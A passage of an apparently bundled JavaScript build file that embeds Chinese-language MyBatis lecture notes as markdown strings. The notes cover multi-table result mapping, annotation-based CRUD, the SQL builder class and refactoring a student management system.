classes = mapper.selectAll();\n     \n             //6.处理结果\n             for (Classes cls : classes) {\n                 System.out.println(cls.getId() + "," + cls.getName());\n                 List<Student> students = cls.getStudents();\n                 for (Student student : students) {\n                     System.out.println("\\t" + student);\n                 }\n             }\n     \n             //7.释放资源\n             sqlSession.close();\n             is.close();\n         }\n     ```\n\n   3.一对多配置文件总结：\n\n   ~~~xml-dtd\n   <resultMap>：配置字段和对象属性的映射关系标签。\n       id 属性：唯一标识\n       type 属性：实体对象类型\n   <id>：配置主键映射关系标签。\n   <result>：配置非主键映射关系标签。\n       column 属性：表中字段名称\n       property 属性： 实体对象变量名称\n   <collection>：配置被包含集合对象的映射关系标签。\n       property 属性：被包含集合对象的变量名\n       ofType 属性：集合中保存的对象数据类型\n   ~~~\n\n    \n\n#### 4.4 多表模型多对多操作\n\n1. 多对多模型：学生和课程，一个学生可以选择多门课程、一个课程也可以被多个学生所选择。       \n\n2. 代码实现\n\n   - 步骤一: sql语句准备\n\n     ```sql\n     CREATE TABLE course(\n     \tid INT PRIMARY KEY AUTO_INCREMENT,\n     \tNAME VARCHAR(20)\n     );\n     INSERT INTO course VALUES (NULL,\'语文\');\n     INSERT INTO course VALUES (NULL,\'数学\');\n     \n     \n     CREATE TABLE stu_cr(\n     \tid INT PRIMARY KEY AUTO_INCREMENT,\n     \tsid INT,\n     \tcid INT,\n     \tCONSTRAINT sc_fk1 FOREIGN KEY (sid) REFERENCES student(id),\n     \tCONSTRAINT sc_fk2 FOREIGN KEY (cid) REFERENCES course(id)\n     );\n     INSERT INTO stu_cr VALUES (NULL,1,1);\n     INSERT INTO stu_cr VALUES (NULL,1,2);\n     INSERT INTO stu_cr VALUES (NULL,2,1);\n     INSERT INTO stu_cr VALUES (NULL,2,2);\n     ```\n\n   - 步骤二:配置文件\n\n     ```xml\n     <?xml version="1.0" encoding="UTF-8" ?>\n     <!DOCTYPE mapper\n             PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"\n             "http://mybatis.org/dtd/mybatis-3-mapper.dtd">\n     \n     <mapper namespace="com.itheima.table03.ManyToManyMapper">\n         <resultMap id="manyToMany" type="student">\n             <id column="sid" property="id"/>\n             <result column="sname" property="name"/>\n             <result column="sage" property="age"/>\n     \n             <collection property="courses" ofType="course">\n                 <id column="cid" property="id"/>\n                 <result column="cname" property="name"/>\n             </collection>\n         </resultMap>\n         <select id="selectAll" resultMap="manyToMany">\n             SELECT sc.sid,s.name sname,s.age sage,sc.cid,c.name cname FROM student s,course c,stu_cr sc WHERE sc.sid=s.id AND sc.cid=c.id\n         </select>\n     </mapper>\n     ```\n\n   - 步骤三：测试类\n\n     ```java\n      @Test\n         public void selectAll() throws Exception{\n             //1.加载核心配置文件\n             InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n     \n             //2.获取SqlSession工厂对象\n             SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n     \n             //3.通过工厂对象获取SqlSession对象\n             SqlSession sqlSession = sqlSessionFactory.openSession(true);\n     \n             //4.获取ManyToManyMapper接口的实现类对象\n             ManyToManyMapper mapper = sqlSession.getMapper(ManyToManyMapper.class);\n     \n             //5.调用实现类的方法，接收结果\n             List<Student> students = mapper.selectAll();\n     \n             //6.处理结果\n             for (Student student : students) {\n                 System.out.println(student.getId() + "," + student.getName() + "," + student.getAge());\n                 List<Course> courses = student.getCourses();\n                 for (Course cours : courses) {\n                     System.out.println("\\t" + cours);\n                 }\n             }\n     \n             //7.释放资源\n             sqlSession.close();\n             is.close();\n         }\n         \n     ```\n\n   3.多对多配置文件总结：\n\n   ```xml-dtd\n   <resultMap>：配置字段和对象属性的映射关系标签。\n   \tid 属性：唯一标识\n   \ttype 属性：实体对象类型\n    <id>：配置主键映射关系标签。\n    <result>：配置非主键映射关系标签。\n   \tcolumn 属性：表中字段名称\n   \tproperty 属性： 实体对象变量名称\n   <collection>：配置被包含集合对象的映射关系标签。\n   \tproperty 属性：被包含集合对象的变量名\n   \tofType 属性：集合中保存的对象数据类型\n   ```\n\n    \n\n#### 4.5 多表模型操作总结\n\n~~~xml-dtd\n <resultMap>：配置字段和对象属性的映射关系标签。\n    id 属性：唯一标识\n    type 属性：实体对象类型\n<id>：配置主键映射关系标签。\n<result>：配置非主键映射关系标签。\n\tcolumn 属性：表中字段名称\n\tproperty 属性： 实体对象变量名称\n<association>：配置被包含对象的映射关系标签。\n\tproperty 属性：被包含对象的变量名\n\tjavaType 属性：被包含对象的数据类型\n<collection>：配置被包含集合对象的映射关系标签。\n\tproperty 属性：被包含集合对象的变量名\n\tofType 属性：集合中保存的对象数据类型\n~~~\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n##### \n\n\n\n',Pt={data:function(){return{MainComponent:Dt}}},Nt=Pt,qt=Object(u["a"])(Nt,At,It,!1,null,"d167a30e",null),Ht=qt.exports,Bt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Ft=[],Ut='\x3c!--\n * @Date           : 2021-04-14 00:54:56\n * @FilePath       : /jinnian-space/src/pages/java/module/mybatis/md/mybatis-第3天讲义.md\n * @Description    : \n--\x3e\n## Mybatis 高级\n\n\n### 一.Mybatis注解开发单表操作\n\n#### 1.1 MyBatis的常用注解 \n\n这几年来注解开发越来越流行，Mybatis也可以使用注解开发方式，这样我们就可以减少编写Mapper\n\n映射文件了。我们先围绕一些基本的CRUD来学习，再学习复杂映射多表操作。\n\n@Insert：实现新增\n\n@Update：实现更新\n\n@Delete：实现删除\n\n@Select：实现查询\n\n@Result：实现结果集封装\n\n@Results：可以与@Result 一起使用，封装多个结果集\n\n@One：实现一对一结果集封装\n\n@Many：实现一对多结果集封装\n\n#### 1.2 MyBatis的增删改查 \n\n我们完成简单的student表的增删改查的操作\n\n* 步骤一:创建mapper接口\n\n  ~~~java\n  public interface StudentMapper {\n      //查询全部\n      @Select("SELECT * FROM student")\n      public abstract List<Student> selectAll();\n  \n      //新增操作\n      @Insert("INSERT INTO student VALUES (#{id},#{name},#{age})")\n      public abstract Integer insert(Student stu);\n  \n      //修改操作\n      @Update("UPDATE student SET name=#{name},age=#{age} WHERE id=#{id}")\n      public abstract Integer update(Student stu);\n  \n      //删除操作\n      @Delete("DELETE FROM student WHERE id=#{id}")\n      public abstract Integer delete(Integer id);\n  }\n  \n  ~~~\n\n* 步骤二：测试类\n\n  ~~~java\n  public class Test01 {\n      @Test\n      public void selectAll() throws Exception{\n          //1.加载核心配置文件\n          InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n  \n          //2.获取SqlSession工厂对象\n          SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n  \n          //3.通过工厂对象获取SqlSession对象\n          SqlSession sqlSession = sqlSessionFactory.openSession(true);\n  \n          //4.获取StudentMapper接口的实现类对象\n          StudentMapper mapper = sqlSession.getMapper(StudentMapper.class);\n  \n          //5.调用实现类对象中的方法，接收结果\n          List<Student> list = mapper.selectAll();\n  \n          //6.处理结果\n          for (Student student : list) {\n              System.out.println(student);\n          }\n  \n          //7.释放资源\n          sqlSession.close();\n          is.close();\n      }\n  \n      @Test\n      public void insert() throws Exception{\n          //1.加载核心配置文件\n          InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n  \n          //2.获取SqlSession工厂对象\n          SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n  \n          //3.通过工厂对象获取SqlSession对象\n          SqlSession sqlSession = sqlSessionFactory.openSession(true);\n  \n          //4.获取StudentMapper接口的实现类对象\n          StudentMapper mapper = sqlSession.getMapper(StudentMapper.class);\n  \n          //5.调用实现类对象中的方法，接收结果\n          Student stu = new Student(4,"赵六",26);\n          Integer result = mapper.insert(stu);\n  \n          //6.处理结果\n          System.out.println(result);\n  \n          //7.释放资源\n          sqlSession.close();\n          is.close();\n      }\n  \n      @Test\n      public void update() throws Exception{\n          //1.加载核心配置文件\n          InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n  \n          //2.获取SqlSession工厂对象\n          SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n  \n          //3.通过工厂对象获取SqlSession对象\n          SqlSession sqlSession = sqlSessionFactory.openSession(true);\n  \n          //4.获取StudentMapper接口的实现类对象\n          StudentMapper mapper = sqlSession.getMapper(StudentMapper.class);\n  \n          //5.调用实现类对象中的方法，接收结果\n          Student stu = new Student(4,"赵六",36);\n          Integer result = mapper.update(stu);\n  \n          //6.处理结果\n          System.out.println(result);\n  \n          //7.释放资源\n          sqlSession.close();\n          is.close();\n      }\n  \n      @Test\n      public void delete() throws Exception{\n          //1.加载核心配置文件\n          InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n  \n          //2.获取SqlSession工厂对象\n          SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n  \n          //3.通过工厂对象获取SqlSession对象\n          SqlSession sqlSession = sqlSessionFactory.openSession(true);\n  \n          //4.获取StudentMapper接口的实现类对象\n          StudentMapper mapper = sqlSession.getMapper(StudentMapper.class);\n  \n          //5.调用实现类对象中的方法，接收结果\n          Integer result = mapper.delete(4);\n  \n          //6.处理结果\n          System.out.println(result);\n  \n          //7.释放资源\n          sqlSession.close();\n          is.close();\n      }\n  }\n  \n  ~~~\n\n* 注意：\n\n  修改MyBatis的核心配置文件，我们使用了注解替代的映射文件，所以我们只需要加载使用了注解的Mapper接口即可\n\n```xml\n<mappers>\n    \x3c!--扫描使用注解的类--\x3e\n    <mapper class="com.itheima.mapper.UserMapper"></mapper>\n</mappers>\n```\n\n​\t或者指定扫描包含映射关系的接口所在的包也可以\n\n```xml\n<mappers>\n    \x3c!--扫描使用注解的类所在的包--\x3e\n    <package name="com.itheima.mapper"></package>\n</mappers>\n```\n\n#### 1.3 注解开发总结\n\n注解可以简化开发操作，省略映射配置文件的编写。 \n\n* 常用注解 \n\n  @Select(“查询的 SQL 语句”)：执行查询操作注解\n\n   @Insert(“查询的 SQL 语句”)：执行新增操作注解\n\n   @Update(“查询的 SQL 语句”)：执行修改操作注解\n\n   @Delete(“查询的 SQL 语句”)：执行删除操作注解 \n\n* 配置映射关系 \n\n  ~~~xml\n  <mappers> <package name="接口所在包"/> </mappers>    \n  ~~~\n\n  \n\n### 二.MyBatis注解开发的多表操作\n\n#### 2.1  MyBatis的注解实现复杂映射开发\n\n实现复杂关系映射之前我们可以在映射文件中通过配置<resultMap>来实现，使用注解开发后，我们可以使用@Results注解，@Result注解，@One注解，@Many注解组合完成复杂关系的配置\n\n![](img\\图片10.png)\n\n![](img\\图片11.png)\n\n#### 2.2  一对一查询\n\n##### 2.2.1 一对一查询的模型\n\n一对一查询的需求：查询一个用户信息，与此同时查询出该用户对应的身份证信息\n\n![1590942011460](./img/java/mybatis/mybatis-第3天讲义.img/1590942011460.png)\n\n##### 2.2.2 一对一查询的语句\n\n对应的sql语句：\n\n```sql\nSELECT * FROM card；\n\nSELECT * FROM person WHERE id=#{id};\n```\n\n##### \n\n##### 2.2.3 创建PersonMapper接口\n\n```java\npublic interface PersonMapper {\n    //根据id查询\n    @Select("SELECT * FROM person WHERE id=#{id}")\n    public abstract Person selectById(Integer id);\n}\n\n```\n\n##### 2.2.4 使用注解配置Mapper\n\n```java\npublic interface CardMapper {\n    //查询全部\n    @Select("SELECT * FROM card")\n    @Results({\n            @Result(column = "id",property = "id"),\n            @Result(column = "number",property = "number"),\n            @Result(\n                    property = "p",             // 被包含对象的变量名\n                    javaType = Person.class,    // 被包含对象的实际数据类型\n                    column = "pid",             // 根据查询出的card表中的pid字段来查询person表\n                    /*\n                        one、@One 一对一固定写法\n                        select属性：指定调用哪个接口中的哪个方法\n                     */\n                    one = @One(select = "com.itheima.one_to_one.PersonMapper.selectById")\n            )\n    })\n    public abstract List<Card> selectAll();\n}\n```\n\n##### 2.2.5 测试类\n\n```java\npublic class Test01 {\n    @Test\n    public void selectAll() throws Exception{\n        //1.加载核心配置文件\n        InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n\n        //2.获取SqlSession工厂对象\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n\n        //3.通过工厂对象获取SqlSession对象\n        SqlSession sqlSession = sqlSessionFactory.openSession(true);\n\n        //4.获取CardMapper接口的实现类对象\n        CardMapper mapper = sqlSession.getMapper(CardMapper.class);\n\n        //5.调用实现类对象中的方法，接收结果\n        List<Card> list = mapper.selectAll();\n\n        //6.处理结果\n        for (Card card : list) {\n            System.out.println(card);\n        }\n\n        //7.释放资源\n        sqlSession.close();\n        is.close();\n    }\n\n}\n\n```\n\n##### 2.2.6  一对一配置总结\n\n~~~xml-dtd\n@Results：封装映射关系的父注解。\n\tResult[] value()：定义了 Result 数组\n@Result：封装映射关系的子注解。\n\tcolumn 属性：查询出的表中字段名称\n\tproperty 属性：实体对象中的属性名称\n\tjavaType 属性：被包含对象的数据类型\n\tone 属性：一对一查询固定属性\n @One：一对一查询的注解。\n\tselect 属性：指定调用某个接口中的方法\n~~~\n\n\n\n#### 2.3 一对多查询\n\n##### 2.3.1 一对多查询的模型\n\n一对多查询的需求：查询一个课程，与此同时查询出该该课程对应的学生信息\n\n![1590942772892](./img/java/mybatis/mybatis-第3天讲义.img/1590942772892.png)\n\n##### 2.3.2 一对多查询的语句\n\n对应的sql语句：\n\n```sql\nSELECT * FROM classes\n\nSELECT * FROM student WHERE cid=#{cid}\n```\n\n##### \n\n##### 2.3.3 创建StudentMapper接口\n\n```java\npublic interface StudentMapper {\n    //根据cid查询student表\n    @Select("SELECT * FROM student WHERE cid=#{cid}")\n    public abstract List<Student> selectByCid(Integer cid);\n}\n\n```\n\n##### 2.3.4 使用注解配置Mapper\n\n```java\npublic interface ClassesMapper {\n    //查询全部\n    @Select("SELECT * FROM classes")\n    @Results({\n            @Result(column = "id",property = "id"),\n            @Result(column = "name",property = "name"),\n            @Result(\n                    property = "students",  // 被包含对象的变量名\n                    javaType = List.class,  // 被包含对象的实际数据类型\n                    column = "id",          // 根据查询出的classes表的id字段来查询student表\n                    /*\n                        many、@Many 一对多查询的固定写法\n                        select属性：指定调用哪个接口中的哪个查询方法\n                     */\n                    many = @Many(select = "com.itheima.one_to_many.StudentMapper.selectByCid")\n            )\n    })\n    public abstract List<Classes> selectAll();\n}\n```\n\n##### 2.3.5 测试类\n\n```java\npublic class Test01 {\n    @Test\n    public void selectAll() throws Exception{\n        //1.加载核心配置文件\n        InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n\n        //2.获取SqlSession工厂对象\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n\n        //3.通过工厂对象获取SqlSession对象\n        SqlSession sqlSession = sqlSessionFactory.openSession(true);\n\n        //4.获取ClassesMapper接口的实现类对象\n        ClassesMapper mapper = sqlSession.getMapper(ClassesMapper.class);\n\n        //5.调用实现类对象中的方法，接收结果\n        List<Classes> list = mapper.selectAll();\n\n        //6.处理结果\n        for (Classes cls : list) {\n            System.out.println(cls.getId() + "," + cls.getName());\n            List<Student> students = cls.getStudents();\n            for (Student student : students) {\n                System.out.println("\\t" + student);\n            }\n        }\n\n        //7.释放资源\n        sqlSession.close();\n        is.close();\n    }\n\n}\n\n```\n\n##### 2.3.6 一对多配置总结\n\n~~~xml-dtd\n@Results：封装映射关系的父注解。\n\tResult[] value()：定义了 Result 数组\n@Result：封装映射关系的子注解。\n\tcolumn 属性：查询出的表中字段名称\n\tproperty 属性：实体对象中的属性名称\n\tjavaType 属性：被包含对象的数据类型\n\tmany 属性：一对多查询固定属性\n@Many：一对多查询的注解。\n\tselect 属性：指定调用某个接口中的方法\n~~~\n\n\n\n#### 2.4  多对多查询\n\n##### 2.4.1 多对多查询的模型\n\n多对多查询的需求：查询学生以及所对应的课程信息\n\n![1590943489827](./img/java/mybatis/mybatis-第3天讲义.img/1590943489827.png)\n\n##### 2.4.2 多对多查询的语句\n\n对应的sql语句：\n\n```sql\nSELECT DISTINCT s.id,s.name,s.age FROM student s,stu_cr sc WHERE sc.sid=s.id\nSELECT c.id,c.name FROM stu_cr sc,course c WHERE sc.cid=c.id AND sc.sid=#{id}\n```\n\n\n\n##### 2.4.3  添加CourseMapper 接口方法\n\n```java\npublic interface CourseMapper {\n    //根据学生id查询所选课程\n    @Select("SELECT c.id,c.name FROM stu_cr sc,course c WHERE sc.cid=c.id AND sc.sid=#{id}")\n    public abstract List<Course> selectBySid(Integer id);\n}\n\n```\n\n##### 2.4.4 使用注解配置Mapper\n\n```java\npublic interface StudentMapper {\n    //查询全部\n    @Select("SELECT DISTINCT s.id,s.name,s.age FROM student s,stu_cr sc WHERE sc.sid=s.id")\n    @Results({\n            @Result(column = "id",property = "id"),\n            @Result(column = "name",property = "name"),\n            @Result(column = "age",property = "age"),\n            @Result(\n                    property = "courses",   // 被包含对象的变量名\n                    javaType = List.class,  // 被包含对象的实际数据类型\n                    column = "id",          // 根据查询出student表的id来作为关联条件，去查询中间表和课程表\n                    /*\n                        many、@Many 一对多查询的固定写法\n                        select属性：指定调用哪个接口中的哪个查询方法\n                     */\n                    many = @Many(select = "com.itheima.many_to_many.CourseMapper.selectBySid")\n            )\n    })\n    public abstract List<Student> selectAll();\n}\n\n```\n\n##### 2.4.5 测试类\n\n```java\npublic class Test01 {\n    @Test\n    public void selectAll() throws Exception{\n        //1.加载核心配置文件\n        InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n\n        //2.获取SqlSession工厂对象\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n\n        //3.通过工厂对象获取SqlSession对象\n        SqlSession sqlSession = sqlSessionFactory.openSession(true);\n\n        //4.获取StudentMapper接口的实现类对象\n        StudentMapper mapper = sqlSession.getMapper(StudentMapper.class);\n\n        //5.调用实现类对象中的方法，接收结果\n        List<Student> list = mapper.selectAll();\n\n        //6.处理结果\n        for (Student student : list) {\n            System.out.println(student.getId() + "," + student.getName() + "," + student.getAge());\n            List<Course> courses = student.getCourses();\n            for (Course cours : courses) {\n                System.out.println("\\t" + cours);\n            }\n        }\n\n        //7.释放资源\n        sqlSession.close();\n        is.close();\n    }\n\n}\n```\n\n##### 2.4.6 多对多配置总结\n\n~~~xml-dtd\n@Results：封装映射关系的父注解。\n\tResult[] value()：定义了 Result 数组\n@Result：封装映射关系的子注解。\n\tcolumn 属性：查询出的表中字段名称\n\tproperty 属性：实体对象中的属性名称\n\tjavaType 属性：被包含对象的数据类型\n\tmany 属性：一对多查询固定属性\n@Many：一对多查询的注解。\n\tselect 属性：指定调用某个接口中的方法\n~~~\n\n\n\n### 三.构建sql\n\n#### 3.1 SQL 构建对象介绍    \n\n* 我们之前通过注解开发时，相关 SQL 语句都是自己直接拼写的。一些关键字写起来比较麻烦、而且容易出错。 \n*  MyBatis 给我们提供了 org.apache.ibatis.jdbc.SQL 功能类，专门用于构建 SQL 语句  \n*  org.apache.ibatis.jdbc.SQL      -     org.apache.ibatis.AbstractSQL  \n\n\n* ![1590943921472](./img/java/mybatis/mybatis-第3天讲义.img/1590943921472.png)\n\n#### 3.2  查询功能的实现\n\n* 定义功能类并提供获取查询的 SQL 语句的方法。 \n\n* @SelectProvider：生成查询用的 SQL 语句注解。\n\n   type 属性：生成 SQL 语句功能类对象 \n\n   method 属性：指定调用方法    \n\n#### 3.3  新增功能的实现\n\n* 定义功能类并提供获取新增的 SQL 语句的方法。 \n\n* @InsertProvider：生成新增用的 SQL 语句注解。 \n\n  type 属性：生成 SQL 语句功能类对象 \n\n  method 属性：指定调用方法    \n\n#### 3.4  修改功能的实现\n\n* 定义功能类并提供获取修改的 SQL 语句的方法。 \n\n*  @UpdateProvider：生成修改用的 SQL 语句注解。 \n\n   type 属性：生成 SQL 语句功能类对象\n\n   method 属性：指定调用方法    \n\n#### 3.5  删除功能的实现\n\n* 定义功能类并提供获取删除的 SQL 语句的方法。 \n\n*  @DeleteProvider：生成删除用的 SQL 语句注解。\n\n   type 属性：生成 SQL 语句功能类对象 \n\n   method 属性：指定调用方法   \n\n ####  3.6  定义sql 语句 ReturnSql.java\n ```java\npackage com.itheima.sql;\n\nimport com.itheima.bean.Student;\nimport org.apache.ibatis.jdbc.SQL;\n\npublic class ReturnSql {\n    //定义方法，返回查询的sql语句\n    public String getSelectAll() {\n        return new SQL() {\n            {\n                SELECT("*");\n                FROM("student");\n            }\n        }.toString();\n    }\n\n    //定义方法，返回新增的sql语句\n    public String getInsert(Student stu) {\n        return new SQL() {\n            {\n                INSERT_INTO("student");\n                INTO_VALUES("#{id},#{name},#{age}");\n            }\n        }.toString();\n    }\n\n    //定义方法，返回修改的sql语句\n    public String getUpdate(Student stu) {\n        return new SQL() {\n            {\n                UPDATE("student");\n                SET("name=#{name}","age=#{age}");\n                WHERE("id=#{id}");\n            }\n        }.toString();\n    }\n\n    //定义方法，返回删除的sql语句\n    public String getDelete(Integer id) {\n        return new SQL() {\n            {\n                DELETE_FROM("student");\n                WHERE("id=#{id}");\n            }\n        }.toString();\n    }\n}\n ```\n\n ####  3.7 使用 sql 语句 StudentMapper.java\n ```java\npackage com.itheima.mapper;\n\nimport com.itheima.bean.Student;\nimport com.itheima.sql.ReturnSql;\nimport org.apache.ibatis.annotations.DeleteProvider;\nimport org.apache.ibatis.annotations.InsertProvider;\nimport org.apache.ibatis.annotations.SelectProvider;\nimport org.apache.ibatis.annotations.UpdateProvider;\n\nimport java.util.List;\n\npublic interface StudentMapper {\n    //查询全部\n    //@Select("SELECT * FROM student")\n    @SelectProvider(type = ReturnSql.class , method = "getSelectAll")\n    public abstract List<Student> selectAll();\n\n    //新增功能\n    //@Insert("INSERT INTO student VALUES (#{id},#{name},#{age})")\n    @InsertProvider(type = ReturnSql.class , method = "getInsert")\n    public abstract Integer insert(Student stu);\n\n    //修改功能\n    //@Update("UPDATE student SET name=#{name},age=#{age} WHERE id=#{id}")\n    @UpdateProvider(type = ReturnSql.class , method = "getUpdate")\n    public abstract Integer update(Student stu);\n\n    //删除功能\n    //@Delete("DELETE FROM student WHERE id=#{id}")\n    @DeleteProvider(type = ReturnSql.class , method = "getDelete")\n    public abstract Integer delete(Integer id);\n}\n\n\n ```\n\n ####  3.8 测试\n ```java\n   @Test\n    public void selectAll() throws Exception{\n        //1.加载核心配置文件\n        InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n\n        //2.获取SqlSession工厂对象\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n\n        //3.通过工厂对象获取SqlSession对象\n        SqlSession sqlSession = sqlSessionFactory.openSession(true);\n\n        //4.获取StudentMapper接口的实现类对象\n        StudentMapper mapper = sqlSession.getMapper(StudentMapper.class);\n\n        //5.调用实现类对象中的方法，接收结果\n        List<Student> list = mapper.selectAll();\n\n        //6.处理结果\n        for (Student student : list) {\n            System.out.println(student);\n        }\n\n        //7.释放资源\n        sqlSession.close();\n        is.close();\n    }\n\n ```\n\n### 四.综合案例\n\n#### 4.1  系统介绍\n\n​         我们之前在做学生管理系统时，使用的是原始JDBC操作数据库的，操作非常麻烦，现在我们使用MyBatis操作数据库，简化Dao的开发。\n\n#### 4.2  环境搭建（略）\n\n#### 4.3  代码改造\n\n* 步骤一：新增MyBatis配置文件 `MyBatisConfig.xml`\n\n  ~~~xml\n  <?xml version="1.0" encoding="UTF-8" ?>\n  \x3c!--MyBatis的DTD约束--\x3e\n  <!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd">\n  \n  \x3c!--configuration 核心根标签--\x3e\n  <configuration>\n  \n      \x3c!--引入数据库连接的配置文件--\x3e\n      <properties resource="config.properties"/>\n  \n      \x3c!--配置LOG4J--\x3e\n      <settings>\n          <setting name="logImpl" value="log4j"/>\n      </settings>\n  \n      \x3c!--environments配置数据库环境，环境可以有多个。default属性指定使用的是哪个--\x3e\n      <environments default="mysql">\n          \x3c!--environment配置数据库环境  id属性唯一标识--\x3e\n          <environment id="mysql">\n              \x3c!-- transactionManager事务管理。  type属性，采用JDBC默认的事务--\x3e\n              <transactionManager type="JDBC"></transactionManager>\n              \x3c!-- dataSource数据源信息   type属性 连接池--\x3e\n              <dataSource type="POOLED">\n                  \x3c!-- property获取数据库连接的配置信息 --\x3e\n                  <property name="driver" value="${driver}" />\n                  <property name="url" value="${url}" />\n                  <property name="username" value="${username}" />\n                  <property name="password" value="${password}" />\n              </dataSource>\n          </environment>\n      </environments>\n  \n      \x3c!--配置映射关系--\x3e\n      <mappers>\n          <package name="com.itheima"/>\n      </mappers>\n  </configuration>\n  \n  ~~~\n\n* 步骤二: 删除`StudentDaoImpl`，修改`StudentDao`\n\n  ```java\n  package com.itheima.dao;\n  \n  import com.itheima.domain.Student;\n  import org.apache.ibatis.annotations.Delete;\n  import org.apache.ibatis.annotations.Insert;\n  import org.apache.ibatis.annotations.Select;\n  import org.apache.ibatis.annotations.Update;\n  \n  import java.util.ArrayList;\n  \n  /*\n      Dao层接口\n   */\n  public interface StudentDao {\n      //查询所有学生信息\n      @Select("SELECT * FROM student")\n      public abstract ArrayList<Student> findAll();\n  \n      //条件查询，根据id获取学生信息\n      @Select("SELECT * FROM student WHERE sid=#{sid}")\n      public abstract Student findById(Integer sid);\n  \n      //新增学生信息\n      @Insert("INSERT INTO student VALUES (#{sid},#{name},#{age},#{birthday})")\n      public abstract int insert(Student stu);\n  \n      //修改学生信息\n      @Update("UPDATE student SET name=#{name},age=#{age},birthday=#{birthday} WHERE sid=#{sid}")\n      public abstract int update(Student stu);\n  \n      //删除学生信息\n      @Delete("DELETE FROM student WHERE sid=#{sid}")\n      public abstract int delete(Integer sid);\n  }\n  \n  ```\n  \n  \n  \n* 步骤三：修改`StudentServiceImpl`\n\n  ```java\n  package com.itheima.service.impl;\n  \n  import com.itheima.dao.StudentDao;\n  import com.itheima.domain.Student;\n  import com.itheima.service.StudentService;\n  import org.apache.ibatis.io.Resources;\n  import org.apache.ibatis.session.SqlSession;\n  import org.apache.ibatis.session.SqlSessionFactory;\n  import org.apache.ibatis.session.SqlSessionFactoryBuilder;\n  \n  import java.io.IOException;\n  import java.io.InputStream;\n  import java.util.ArrayList;\n  import java.util.List;\n  \n  /**\n   * 学生的业务层实现类\n   * @author 黑马程序员\n   * @Company http://www.itheima.com\n   */\n  public class StudentServiceImpl implements StudentService {\n  \n      @Override\n      public List<Student> findAll() {\n          ArrayList<Student> list = null;\n          SqlSession sqlSession = null;\n          InputStream is = null;\n          try{\n              //1.加载核心配置文件\n              is = Resources.getResourceAsStream("MyBatisConfig.xml");\n  \n              //2.获取SqlSession工厂对象\n              SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n  \n              //3.通过工厂对象获取SqlSession对象\n              sqlSession = sqlSessionFactory.openSession(true);\n  \n              //4.获取StudentDao接口的实现类对象\n              StudentDao mapper = sqlSession.getMapper(StudentDao.class);\n  \n              //5.调用实现类对象的方法，接收结果\n              list = mapper.findAll();\n  \n          } catch (Exception e) {\n              e.printStackTrace();\n          } finally {\n              //6.释放资源\n              if(sqlSession != null) {\n                  sqlSession.close();\n              }\n              if(is != null) {\n                  try {\n                      is.close();\n                  } catch (IOException e) {\n                      e.printStackTrace();\n                  }\n              }\n          }\n  \n          //7.返回结果\n          return list;\n      }\n  \n      @Override\n      public Student findById(Integer sid) {\n          Student stu = null;\n          SqlSession sqlSession = null;\n          InputStream is = null;\n          try{\n              //1.加载核心配置文件\n              is = Resources.getResourceAsStream("MyBatisConfig.xml");\n  \n              //2.获取SqlSession工厂对象\n              SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n  \n              //3.通过工厂对象获取SqlSession对象\n              sqlSession = sqlSessionFactory.openSession(true);\n  \n              //4.获取StudentDao接口的实现类对象\n              StudentDao mapper = sqlSession.getMapper(StudentDao.class);\n  \n              //5.调用实现类对象的方法，接收结果\n              stu = mapper.findById(sid);\n  \n          } catch (Exception e) {\n              e.printStackTrace();\n          } finally {\n              //6.释放资源\n              if(sqlSession != null) {\n                  sqlSession.close();\n              }\n              if(is != null) {\n                  try {\n                      is.close();\n                  } catch (IOException e) {\n                      e.printStackTrace();\n                  }\n              }\n          }\n  \n          //7.返回结果\n          return stu;\n      }\n  \n      @Override\n      public void save(Student student) {\n          SqlSession sqlSession = null;\n          InputStream is = null;\n          try{\n              //1.加载核心配置文件\n              is = Resources.getResourceAsStream("MyBatisConfig.xml");\n  \n              //2.获取SqlSession工厂对象\n              SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n  \n              //3.通过工厂对象获取SqlSession对象\n              sqlSession = sqlSessionFactory.openSession(true);\n  \n              //4.获取StudentDao接口的实现类对象\n              StudentDao mapper = sqlSession.getMapper(StudentDao.class);\n  \n              //5.调用实现类对象的方法，接收结果\n              mapper.insert(student);\n  \n          } catch (Exception e) {\n              e.printStackTrace();\n          } finally {\n              //6.释放资源\n              if(sqlSession != null) {\n                  sqlSession.close();\n              }\n              if(is != null) {\n                  try {\n                      is.close();\n                  } catch (IOException e) {\n                      e.printStackTrace();\n                  }\n              }\n          }\n      }\n  \n      @Override\n      public void update(Student student) {\n          SqlSession sqlSession = null;\n          InputStream is = null;\n          try{\n              //1.加载核心配置文件\n              is = 